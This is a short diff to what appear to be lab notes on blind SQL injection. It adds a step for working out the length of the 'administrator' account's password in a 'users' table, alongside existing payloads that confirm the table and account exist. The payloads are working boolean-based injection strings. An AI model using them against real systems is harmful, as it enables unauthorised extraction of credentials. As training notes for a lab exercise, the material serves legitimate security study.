@@ -222,6 +222,11 @@ GIVEN :The database contains a different table called users, with columns called
    ' AND (SELECT 'X' FROM USERS WHERE USERNAME='administrator')='X' --+
    ' AND (SELECT USERNAME FROM USERS WHERE USERNAME='administrator')='administrator' --+
 
+   -ENUMERATE THE PASSWORD OF administrator
+
+    1.Find the length of password:
+     ' AND (SELECT USERNAME FROM USERS WHERE USERNAME='administrator' AND LENGTH(password)>1)='administrator' --+
+      
 
 
 
